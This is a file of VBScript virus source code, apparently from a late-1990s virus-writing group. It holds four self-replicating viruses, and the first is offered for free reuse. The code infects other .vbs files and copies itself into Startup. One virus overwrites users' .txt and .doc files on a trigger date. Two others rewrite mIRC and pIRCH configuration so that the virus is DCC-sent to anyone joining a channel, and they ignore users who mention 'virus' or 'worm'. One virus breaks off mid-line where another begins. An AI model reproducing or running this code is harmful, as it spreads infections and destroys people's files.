'-@
' Bumblebee - my first VB Script Virus
' by Bumblebee/[Hail and Kill] '99
' Feel free to use and modify it
'
  on error resume next

  const fdWrite=2, fdRead=1
  endl=chr(13)&chr(10)

  remove=endl&"   This system is infected by Bumblebee.vbs Virus."&endl&endl&"   Don't worry, it's a easy-to-remove virus:"&endl&endl&"      . Edit all of your system .vbs files and"&endl&"       delete from "&chr(39)&"-"&"@ to "&chr(39)&"-"&"@"&endl&endl&"   (C) 1999 Bumblebee/[Hail and Kill] ;)"&endl&endl
  hostName=Wscript.ScriptFullName  

  set fso=createObject("Scripting.FileSystemObject")

  set myShell=createObject("WScript.Shell")
  infCount=0
  infCount=myShell.regRead("HKCU\infCount")
  if infCount<1 then
        myShell.regWrite "HKCU\infCount",1
        infCount=1
  end if
  if infCount>10 then
        desk=myShell.specialFolders("Desktop")
        set fd=fso.openTextFile(desk&"\\Remove me!.txt",fdWrite,1)
        fd.write remove
        fd.close
  end if

  set fd=fso.openTextFile(hostName,fdRead)
  hostCode=fd.readAll
  fd.close

  virusSize=inStr(4,hostCode,"-"&"@")+1

  set fd=fso.openTextFile(hostName,fdRead)
  virusCode=fd.read(virusSize)
  fd.close

  for each victim in fso.getfolder(".").files

        vExt=fso.getExtensionName(victim.name)
        i=0
        if mid(vExt,1,1)="v" or mid(vExt,1,1)="V" then i=i+1 end if
        if mid(vExt,2,1)="b" or mid(vExt,2,1)="B" then i=i+1 end if
        if mid(vExt,3,1)="s" or mid(vExt,3,1)="S" then i=i+1 end if

        if i=3 then
                set fd=fso.openTextFile(victim.path,fdRead)
                victimCode=fd.readAll
                fd.close
                if left(victimCode,3)<>chr(39)&"-"&"@" then
                        infCount=infCount+1
                        infectedCode=virusCode&endl&victimCode
                        set fd=fso.openTextFile(victim.path,fdWrite,1)
                        fd.write infectedCode
                        fd.close
                end if
        end if
  next
  myShell.regWrite "HKCU\infCount",infCount

'-@
'VBSv777


On Error Resume Next

Const cbVirusSize = 3914
Const cbForReading=1, cbForWriting=2
Const cbWindowsFolder = 0

Dim cbFSO, cbInfectionMarker, cbVictimCode, cbVirusCode
Dim cbWePath, cbWeFile, cbVictim, VictimFile
Dim cbFoldersToInfect(3), cbFolder, cbFile, cbDriveList, cbDrive
Dim cbTextFile


Set cbFSO = CreateObject("Scripting.FileSystemObject")

cbWePath = Wscript.ScriptFullName

cbFoldersToInfect(0) = "."
cbFoldersToInfect(1) = cbFSO.GetSpecialFolder(cbWindowsFolder)
cbFoldersToInfect(2) = cbFSO.GetSpecialFolder(cbWindowsFolder) & "\Profiles\All Users\Desktop"
cbFoldersToInfect(3) = cbFSO.GetSpecialFolder(cbWindowsFolder) & "\Profiles\Administrator\Desktop"
cbFoldersToInfect(4) = cbFSO.GetSpecialFolder(cbWindowsFolder) & "\Desktop"


Set cbWeFile=cbFSO.OpenTextFile(cbWePath, cbForReading)
cbVirusCode = cbWeFile.Read(cbVirusSize)
cbWeFile.Close


For Each cbFolder in cbFoldersToInfect
  cbInfect cbFolder
Next


If Day(Now()) = 2 And Hour(Now()) = 9 Then

  Set cbDriveList = cbFSO.Drives

  For Each cbDrive in cbDriveList
    If cbDrive.DriveType = 2 Or cbDrive.DriveType = 3 then cbRecursiveFolderScan cbDrive & "\"
  Next

End If



Sub cbRecursiveFolderScan(cbTheFolder)

  Dim cbMoreFolders, cbTempFolder 


  For Each cbFile in cbFSO.GetFolder(TheFolder).Files
    If cbFSO.GetExtensionName(cbFile) = "txt" or cbFSO.GetExtensionName(cbFile) = "doc" Then

      Set cbTextFile = cbFSO.OpenTextFile(cbFile, cbForWriting)
      cbTextFile.WriteLine "                                       "
      cbTextFile.WriteLine "      _                         _      "
      cbTextFile.WriteLine "     |_|                       |_|     "
      cbTextFile.WriteLine "     | |         /^^^\         | |     "
      cbTextFile.WriteLi'Welcomb


'= VBS/mIRC/pIRCH.WelcomB.a                         =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
'= Technology used from Code Breakers               =
On Error Resume Next
Const Welcomb = 5416
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Const XWindowsFolder = 0

Dim FSO, ScrFile, Cini, InfMarker, MyCode
Dim Parent, MyWelcomb, V, VFile, EvFile
Dim FoldersToGet(2), FolderX, VCode

Set FSO = CreateObject("Scripting.FileSystemObject")
Parent = Wscript.ScriptFullName

Set Cini = FSO.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
      Cini.WriteLine "[rfiles]"
      Cini.WriteLine "n100=script.ini"
      Cini.Close

Set ScrFile = FSO.CreateTextFile("c:\mirc\script.ini", True)
  ScrFile.WriteLine "[script]"
  ScrFile.WriteLine "n0; VBS/mIRC/pIRCH WelcomB.a"
  ScrFile.WriteLine "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
  ScrFile.WriteLine "n2=  /dcc send $nick c:\WINDOWS\system\cute.vbs"
  ScrFile.WriteLine "n3=}"
  ScrFile.WriteLine "n4="
  ScrFile.WriteLine "n5=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
  ScrFile.WriteLine "n6=/dcc send $nick c:\WINDOWS\system\cute.vbs"
  ScrFile.WriteLine "n7=}"
  ScrFile.WriteLine "n8="
  ScrFile.WriteLine "n9=on 1:TEXT:*script.ini*:#:/.ignore $nick"
  ScrFile.WriteLine "n10=on 1:TEXT:*script.ini*:?:/.ignore $nick"
  ScrFile.WriteLine "n11=on 1:TEXT:*virus*:#:/.ignore $nick"
  ScrFile.WriteLine "n12=on 1:TEXT:*virus*:?:/.ignore $nick"
  ScrFile.WriteLine "n13=on 1:TEXT:*worm*:#:/.ignore $nick"
  ScrFile.WriteLine "n14=on 1:TEXT:*worm*:?:/.ignore $nick"
  ScrFile.WriteLine "n15=on 1:TEXT:*cute*:#:/.ignore $nick"
  ScrFile.WriteLine "n16=on 1:TEXT:*cute*:?:/.ignore $nick"
  ScrFile.WriteLine "n17=on 1:TEXT:*WelcomB*:#:/.ignore $nick"
  ScrFile.WriteLine "n18=on 1:TEXT:*WelcomB*:?:/.ignore $nick"
  ScrFile.WriteLine "n19=on 1:QUIT:#:/msg $chan There the Teachers that taught me to hate me"
  ScrFile.Close

Set EvFile = FSO.CreateTextFile("c:\WINDOWS\events.dll", True)
  EvFile.WriteLine "[Levels]"
  EvFile.WriteLine "Enabled=1"
  EvFile.WriteLine "Count=6"
  EvFile.WriteLine "Level1=000-Unknowns"
  EvFile.WriteLine "000-UnknownsEnabled=1"
  EvFile.WriteLine "Level2=100-Level 100"
  EvFile.WriteLine "100-Level 100Enabled=1"
  EvFile.WriteLine "Level3=200-Level 200"
  EvFile.WriteLine "200-Level 200Enabled=1"
  EvFile.WriteLine "Level4=300-Level 300"
  EvFile.WriteLine "300-Level 300Enabled=1"
  EvFile.WriteLine "Level5=400-Level 400"
  EvFile.WriteLine "400-Level 400Enabled=1"
  EvFile.WriteLine "Level6=500-Level 500"
  EvFile.WriteLine "500-Level 500Enabled=1"
  EvFile.WriteLine ""
  EvFile.WriteLine "[000-Unknowns]"
  EvFile.WriteLine "User1=*!*@*"
  EvFile.WriteLine "UserCount=1"
  EvFile.WriteLine "Event1=; VBS/mIRC/pIRCH WelcomB.a"
  EvFile.WriteLine "Event2=ON JOIN:#:/dcc send $nick c:\WINDOWS\system\cute.vbs"
  EvFile.WriteLine "Event2=ON PART:#:/dcc send $nick c:\WINDOWS\system\cute.vbs"  
  EvFile.WriteLine "Event3=VERSION:/notice $nick \-1 pIRCH: WelcomB by -KD- I'm Infected!!! \-1:-"
  EvFile.WriteLine "Event4=ON TEXT:*WelcomB*:#:/kick # $nick pIRCH/VBS/mIRC"
  EvFile.WriteLine "Event5=ON TEXT:*WelcomB*:#:/ignore # $nick"
  EvFile.WriteLine "Event6=ON TEXT:*vbs*:#:/ignore # $nick"
  EvFile.WriteLine "Event7=ON TEXT:*virus*:#:/ignore # $nick"
  EvFile.WriteLine "Event8=ON TEXT:*worm*:#:/ignore # $nick"
  EvFile.WriteLine "Event9=ON TEXT:*cute*:#:/ignore # $nick"
  EvFile.WriteLine "EventCount=9"
  EvFile.WriteLine ""
  EvFile.WriteLine "[100-Level 100]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[200-Level 200]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[300-Level 300]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[400-Level 400]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.WriteLine ""
  EvFile.WriteLine "[500-Level 500]"
  EvFile.WriteLine "UserCount=0"
  EvFile.WriteLine "EventCount=0"
  EvFile.Close

FSO.CopyFile "c:\WINDOWS\events.dll", "c:\pirch32\events.ini"
FSO.CopyFile "c:\WINDOWS\events.dll", "c:\pirch98\events.ini"
FSO.CopyFile Parent, "c:\WINDOWS\system\cute.vbs"
FSO.CopyFile Parent, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"

If Day(Now()) = 1 or Day(Now()) = 20 Then
  MsgBox "There the teacher's that taught me to hate me.", 4096 , "WelcomB"
End If

FoldersToGet(0) = "."
FoldersToGet(1) = FSO.GetSpecialFolder(XWindowsFolder)
FoldersToGet(2) = FSO.GetSpecialFolder(XWindowsFolder) & "\Desktop"
Set MyWelcomb = FSO.OpenTextFile(Parent, ForReading)
MyCode = MyWelcomb.Read(Welcomb)
MyWelcomb.Close

For Each FolderX in FoldersToGet
   Catch FolderX
Next

Sub Catch(TheFolder)

For Each V in FSO.GetFolder(TheFolder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" then

Set VFile = FSO.OpenTextFile(V.Path,ForReading)
    InfMarker = VFile.read(8)
    VFile.close

If InfMarker <> "'Welcomb" Then
      Set VFile = FSO.OpenTextFile(V.path,ForReading)
      VCode = VFile.ReadAll
      VFile.close
      VCode = MyCode & VCode
      Set VFile = FSO.OpenTextFile(V.Path,ForWriting,True)
      VFile.Write VCode
      VFile.close
    end if
  end if
next
End Sub
'->'Crystal

'= VBS/pIRCH98/32.Crystal.c                         =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
On Error Resume Next
Const TheCrystal = 5238
Const ForReading = 1, ForWriting = 2
Const XWindowsFolder = 0

Dim FSO, InfMarker, MyCode, MyBaby
Dim Crystal, MyCrystal, V, VFile
Dim FoldersToGet(3), FolderX, VCode

Set FSO = CreateObject("Scripting.FileSystemObject")
Crystal = Wscript.ScriptFullName

Set MyBaby = FSO.CreateTextFile("c:\WINDOWS\events3.dll", True)
MyBaby.WriteLine "[Levels]"
MyBaby.WriteLine "Enabled=1"
MyBaby.WriteLine "Count=6"
MyBaby.WriteLine "Level1=000-Unknowns"
MyBaby.WriteLine "000-UnknownsEnabled=1"
MyBaby.WriteLine "Level2=100-Level 100"
MyBaby.WriteLine "100-Level 100Enabled=1"
MyBaby.WriteLine "Level3=200-Level 200"
MyBaby.WriteLine "200-Level 200Enabled=1"
MyBaby.WriteLine "Level4=300-Level 300"
MyBaby.WriteLine "300-Level 300Enabled=1"
MyBaby.WriteLine "Level5=400-Level 400"
MyBaby.WriteLine "400-Level 400Enabled=1"
MyBaby.WriteLine "Level6=500-Level 500"
MyBaby.WriteLine "500-Level 500Enabled=1"
MyBaby.WriteLine ""
MyBaby.WriteLine "[000-Unknowns]"
MyBaby.WriteLine "User1=*!*@*"
MyBaby.WriteLine "UserCount=1"
MyBaby.WriteLine "Event1=; VBS/pIRCH98/32.Crystal.c"
MyBaby.WriteLine "Event2=; by -KD- [Metaphase VX Team] & [NoMercyVirusTeam]"
MyBaby.WriteLine "Event3=ON JOIN:#:/notice $nick Tell me that file isnt the cutest ;)"
MyBaby.WriteLine "Event4=ON JOIN:#:/dcc send $nick  c:\windows\Crystal2.vbs"
MyBaby.WriteLine "Event5=@ON BAN:*:#:/mode # -o+b $me $banmask | /kick # $nick Dont ban me!!"
MyBaby.WriteLine "Event6=ON PART:#:/notice $nick Case I didnt send it yet this is the cutest thing Ive seen ;)"
MyBaby.WriteLine "Event7=ON PART:#:/dcc send $nick c:\windows\Crystal2.vbs"
MyBaby.WriteLine "Event8=VERSION:/notice $nick \-1 VBS/pIRCH98/32.Crystal.c : Crystal.a by -KD- I'm Infected!!! \-1:-"
MyBaby.WriteLine "Event9=ON TOPIC:#:/topic # Crystal rocks! | /notice $nick Crystal!!!"
MyBaby.WriteLine "Event10=ON ACTION:*hump*:#:/notice $nick Get off my leg!!"
MyBaby.WriteLine "Event11=ON ACTION:*hump*:#:/kick # $nick Get off my leg I said!!"
MyBaby.WriteLine "Event12=ON TEXT:*hump*:#:/ignore # $nick"
MyBaby.WriteLine "Event13=ON TEXT:*sex*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event14=ON TEXT:*fuck*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event15=ON TEXT:*damn*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event16=ON TEXT:*satan*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event17=ON TEXT:*dick*:#:/kick # $nick Crystal!!!"
MyBaby.WriteLine "Event18=ON TEXT:*hump*:#:/ignore # $nick"
MyBaby.WriteLine "Event19=ON TEXT:*hell*:#:/ignore # $nick"
MyBaby.WriteLine "Event20=ON TEXT:*virus*:#:/ignore # $nick"
MyBaby.WriteLine "Event21=ON TEXT:*worm*:#:/ignore # $nick"
MyBaby.WriteLine "Event22=ON TEXT:*trojan*:#:/ignore # $nick"
MyBaby.WriteLine "Event23=ON TEXT:*Crystal*:#:/ignore # $nick"
MyBaby.WriteLine "Event24=ON TEXT:*baby*:*:/dcc send $nick c:\windows\Crystal2.vbs"
MyBaby.WriteLine "Event25=PING:/notice $nick Oh god baby do it again! ;)"
MyBaby.WriteLine "Event26=ON QUIT:/msg :#vir: VBS/pIRCH98/32.Crystal.c by -KD-! gotta love it!"
MyBaby.WriteLine "Event27=ON KICKED:*:#: /msg $nick What the hell? | /join # | /mode # -o+b $nick $banmask"
MyBaby.WriteLine "EventCount=27"
MyBaby.WriteLine ""
MyBaby.WriteLine "[100-Level 100]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[200-Level 200]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[300-Level 300]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[400-Level 400]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.WriteLine ""
MyBaby.WriteLine "[500-Level 500]"
MyBaby.WriteLine "UserCount=0"
MyBaby.WriteLine "EventCount=0"
MyBaby.Close
FSO.CopyFile "c:\WINDOWS\events3.dll", "c:\pirch98\events.ini"
FSO.CopyFile "c:\WINDOWS\events3.dll", "c:\pirch32\events.ini"
FSO.CopyFile Crystal, "c:\WINDOWS\Crystal2.vbs"
FSO.CopyFile Crystal, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"

If Day(Now()) = 1 or Day(Now()) = 20 Then
  MsgBox "The screams fill the room" & Chr(13) & Chr(10) & "Alone I drop and kneel", 4096 , "Crystal"
End If

FoldersToGet(0) = "."
FoldersToGet(1) = FSO.GetSpecialFolder(XWindowsFolder)
FoldersToGet(2) = FSO.GetSpecialFolder(XWindowsFolder) & "\Desktop"

Set MyCrystal = FSO.OpenTextFile(Crystal, ForReading)
MyCode = MyCrystal.Read(TheCrystal)
MyCrystal.Close

For Each FolderX in FoldersToGet
   Catch FolderX
Next

Sub Catch(TheFolder)

For Each V in FSO.GetFolder(TheFolder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" then

Set VFile = FSO.OpenTextFile(V.Path,ForReading)
    InfMarker = VFile.read(8)
    VFile.close

If InfMarker <> "'Crystal" Then
      Set VFile = FSO.OpenTextFile(V.path,ForReading)
      VCode = VFile.ReadAll
      VFile.close
      VCode = MyCode & VCode
      Set VFile = FSO.OpenTextFile(V.Path,ForWriting,True)
      VFile.Write VCode
      VFile.close
    end if
  end if
next
End Sub
'---> Exit